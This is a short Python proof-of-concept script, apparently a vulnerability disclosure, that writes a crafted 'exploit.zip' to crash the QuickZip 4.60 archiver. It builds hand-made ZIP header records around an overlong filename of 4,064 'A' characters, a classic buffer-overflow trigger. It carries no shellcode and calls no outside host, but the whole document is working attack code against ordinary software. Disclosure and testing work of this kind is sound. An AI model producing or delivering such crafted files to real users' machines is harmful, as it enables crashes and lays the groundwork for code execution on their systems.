#!/usr/bin/env python3
# QuickZip 4.60 - PoC to replicate crash
# Author: Prashant Kumar

filename="exploit.zip"

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00"
              "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
              "\x00\x00\x00\x00\x00\x00\x00\x00"
              "\xe4\x0f"              # file size
              "\x00\x00\x00")

cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14"
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"                # file size
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00" # Size of central directory (bytes)
"\x02\x10\x00\x00" # Offset of start of central directory, relative to start of archive
"\x00\x00")

payload = "A"*4064
payload = payload + ".txt"

print("Size : " + str(len(payload)))
print("Creating new " + filename + " file")
f = open(filename, 'w')
f.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
f.close()
